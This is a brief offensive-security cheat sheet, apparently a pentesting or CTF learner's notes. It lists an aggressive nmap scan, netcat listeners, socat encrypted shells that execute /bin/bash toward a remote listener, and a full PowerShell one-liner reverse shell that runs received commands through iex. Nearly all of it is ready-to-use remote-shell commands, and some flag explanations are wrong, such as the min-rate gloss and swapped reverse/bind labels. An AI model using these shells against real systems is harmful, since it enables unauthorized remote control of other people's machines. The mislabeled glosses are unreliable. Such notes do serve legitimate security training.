# SUMMARY OF SCRIPTS AND USER CASES

## NMAP 
```
sudo nmap -sS -sV -sC -T4 --min-rate 8888 $TARGET -vv
# -sS: stealth
# -sC: scripting
# -sV: service detection
# -T4: aggresiveness
# --min-rate: packet strength 
```
## NETCAT 
```
#REVERSE SHELL 
nc -lvnp <port-number>
# -l: listen
# -v: verbose
# -n: no dns resolve
# -p: specify port
nc -lvnp 4444

#BIND SHELL
nc <target-ip> <port-number>
# This will connect to the listener
nc 10.10.10.10 4444
```

## SOCAT ENCRYPTED SHELLS
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt 
cat shell.crt shell.key > shell.pem


# TO START THE ENCRYPTED LISTENER
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# TO CONNECT TO THE LISTENER
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

## POWERSHELL
One liner reverse shell 
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

